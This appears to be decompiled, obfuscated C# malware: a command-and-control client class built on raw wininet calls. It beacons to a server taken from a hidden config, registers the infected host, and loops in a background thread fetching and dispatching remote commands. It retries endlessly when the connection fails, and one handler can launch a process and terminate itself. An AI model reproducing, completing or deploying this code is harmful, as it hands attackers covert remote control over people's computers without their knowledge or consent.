using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using ns1;

namespace ns0;

internal class Class2 : Class1
{
	private enum Enum3 : uint
	{
		const_0 = 0u,
		const_1 = 1u,
		const_2 = 2u,
		const_3 = 3u,
		const_4 = 0u,
		const_5 = 1u
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct Struct1
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 20)]
		public byte[] byte_0;

		[MarshalAs(UnmanagedType.U4)]
		public int int_0;

		[MarshalAs(UnmanagedType.U4)]
		public int int_1;

		public Struct1(string string_0, int int_2, int int_3)
		{
			byte_0 = new byte[20];
			int_0 = int_2;
			int_1 = int_3;
			Array.Copy(Encoding.Default.GetBytes(string_0), 0, byte_0, 0, string_0.Length);
		}
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct Struct2
	{
		[MarshalAs(UnmanagedType.U4)]
		public uint uint_0;

		[MarshalAs(UnmanagedType.U4)]
		public uint uint_1;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 64)]
		public byte[] byte_0;

		public Struct2(byte[] byte_1)
		{
			Class3.smethod_2(ref byte_1);
			GCHandle gCHandle = GCHandle.Alloc(byte_1, GCHandleType.Pinned);
			IntPtr ptr = gCHandle.AddrOfPinnedObject();
			gCHandle.Free();
			this = (Struct2)Marshal.PtrToStructure(ptr, typeof(Struct2));
		}
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct Struct3
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 38)]
		public byte[] byte_0;

		[MarshalAs(UnmanagedType.U4)]
		public uint uint_0;

		[MarshalAs(UnmanagedType.U4)]
		public uint uint_1;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 64)]
		public byte[] byte_1;

		public Struct3(string string_0, uint uint_2, uint uint_3, byte[] byte_2)
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			byte_0 = new byte[38];
			byte_1 = new byte[64];
			uint_0 = uint_2;
			uint_1 = uint_3;
			Array.Copy(Encoding.Default.GetBytes(string_0), 0, byte_0, 0, string_0.Length);
			Array.Copy(byte_2, 0, byte_1, 0, byte_2.Length);
		}
	}

	private const uint uint_1 = 1u;

	private const short short_0 = 80;

	private const uint uint_2 = 3u;

	private const uint uint_3 = 512u;

	private const uint uint_4 = 19u;

	private const uint uint_5 = 536870912u;

	private const uint uint_6 = 43u;

	private const uint uint_7 = 200u;

	private static IntPtr intptr_0 = IntPtr.Zero;

	private static Thread thread_0 = new Thread(smethod_4);

	private static bool bool_0 = false;

	private static string string_1 = string.Empty;

	public static void smethod_2()
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		if (bool_0)
		{
			bool_0 = false;
		}
		if (string_1 != string.Empty && string_1.IndexOf(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_2()) == -1)
		{
			string_1 = string_1 + Environment.NewLine + _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_3();
		}
		urP();
	}

	private static void urP()
	{
		IntPtr intPtr = InternetOpen(Class12.string_4, 1u, null, null, 0u);
		if (intPtr != IntPtr.Zero)
		{
			if (intptr_0 != IntPtr.Zero)
			{
				InternetCloseHandle(intptr_0);
			}
			intptr_0 = InternetConnect(intPtr, Encoding.Default.GetString(Class12.byte_0), 80, null, null, 3u, 0u, IntPtr.Zero);
			if (intptr_0 != IntPtr.Zero)
			{
				byte[] array = smethod_6(0u, Class3.smethod_0(), bool_1: false);
				if (array.Length > 0 && new Struct2(array).uint_1 == 1)
				{
					string_1 = string_1.Substring(0, string_1.IndexOf(Environment.NewLine));
					smethod_3();
					return;
				}
			}
			InternetCloseHandle(intPtr);
		}
		Thread.Sleep(1000 * Class12.int_0);
		smethod_2();
	}

	private static void smethod_3()
	{
		if (new Struct2(smethod_6(1u, new Struct1(Class12.string_3, Class12.ushort_0, Class12.int_1), bool_1: true)).uint_1 == 1)
		{
			bool_0 = true;
			thread_0.Start();
		}
		else
		{
			smethod_2();
		}
	}

	private static void smethod_4()
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		while (bool_0)
		{
			try
			{
				Class1.smethod_0(new Struct2(smethod_6(2u, null, bool_1: true)));
			}
			catch
			{
			}
			Thread.Sleep(1000 * Class12.int_0);
		}
	}

	public static void smethod_5()
	{
		Struct2 @struct = new Struct2(smethod_6(3u, null, bool_1: true));
		if (@struct.uint_1 == 1)
		{
			string @string = Encoding.Default.GetString(@struct.byte_0);
			char[] trimChars = new char[1];
			string text = @string.Trim(trimChars);
			if (text != string.Empty)
			{
				Class11.smethod_2();
				if (!Class0.smethod_7(text))
				{
					Process.Start(Class12.string_0);
				}
				Environment.Exit(0);
			}
		}
		else
		{
			smethod_2();
		}
	}

	private static byte[] smethod_6(uint uint_8, object object_0, bool bool_1)
	{
		IntPtr intPtr = HttpOpenRequest(intptr_0, _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_4(), Class12.string_1, null, null, null, 2214917888u, IntPtr.Zero);
		if (intPtr != IntPtr.Zero)
		{
			byte[] array = new byte[0];
			if (bool_1)
			{
				array = Class0.smethod_3(new Struct3(Class12.string_2, Class0.smethod_8(), uint_8, Class0.smethod_3(object_0)));
				Class3.smethod_1(ref array);
			}
			else
			{
				array = Class0.smethod_3(object_0);
			}
			if (HttpSendRequest(intPtr, string_1, (uint)string_1.Length, array, (uint)array.Length))
			{
				IntPtr intPtr2 = Marshal.AllocHGlobal(4);
				uint uint_9 = 4u;
				if (HttpQueryInfo(intPtr, 536870931u, intPtr2, ref uint_9, null) && Marshal.ReadInt32(intPtr2) == 200L)
				{
					Marshal.FreeHGlobal(intPtr2);
					IntPtr intPtr3 = Marshal.AllocHGlobal(128);
					uint_9 = 128u;
					if (HttpQueryInfo(intPtr, 43u, intPtr3, ref uint_9, null))
					{
						string text = Marshal.PtrToStringUni(intPtr3)!.TrimStart(new char[0]);
						if (text.StartsWith(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_5()))
						{
							string_1 = _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_6() + text.Substring(0, text.IndexOf(';')) + Environment.NewLine;
						}
					}
					Marshal.FreeHGlobal(intPtr3);
					IntPtr intPtr4 = Marshal.AllocHGlobal(512);
					uint_9 = 512u;
					InternetReadFile(intPtr, intPtr4, 512u, ref uint_9);
					InternetCloseHandle(intPtr);
					byte[] array2 = new byte[uint_9];
					Marshal.Copy(intPtr4, array2, 0, (int)uint_9);
					Marshal.FreeHGlobal(intPtr4);
					return array2;
				}
				Marshal.FreeHGlobal(intPtr2);
			}
			InternetCloseHandle(intPtr);
		}
		return new byte[0];
	}

	[DllImport("wininet", CharSet = CharSet.Unicode)]
	private static extern IntPtr InternetOpen(string string_2, uint uint_8, string string_3, string string_4, uint uint_9);

	[DllImport("wininet", CharSet = CharSet.Unicode)]
	private static extern bool InternetCloseHandle(IntPtr intptr_1);

	[DllImport("wininet", CharSet = CharSet.Unicode)]
	private static extern IntPtr InternetConnect(IntPtr intptr_1, string string_2, short short_1, string string_3, string string_4, uint uint_8, uint uint_9, IntPtr intptr_2);

	[DllImport("wininet", CharSet = CharSet.Unicode)]
	private static extern IntPtr HttpOpenRequest(IntPtr intptr_1, string string_2, string string_3, string string_4, string string_5, string[] string_6, uint uint_8, IntPtr intptr_2);

	[DllImport("wininet", CharSet = CharSet.Unicode)]
	private static extern bool HttpSendRequest(IntPtr intptr_1, string rWv, uint uint_8, byte[] byte_0, uint uint_9);

	[DllImport("wininet", CharSet = CharSet.Unicode)]
	private static extern bool HttpQueryInfo(IntPtr intptr_1, uint uint_8, IntPtr intptr_2, ref uint uint_9, object object_0);

	[DllImport("wininet", CharSet = CharSet.Unicode)]
	private static extern bool InternetReadFile(IntPtr intptr_1, IntPtr intptr_2, uint uint_8, ref uint uint_9);
}
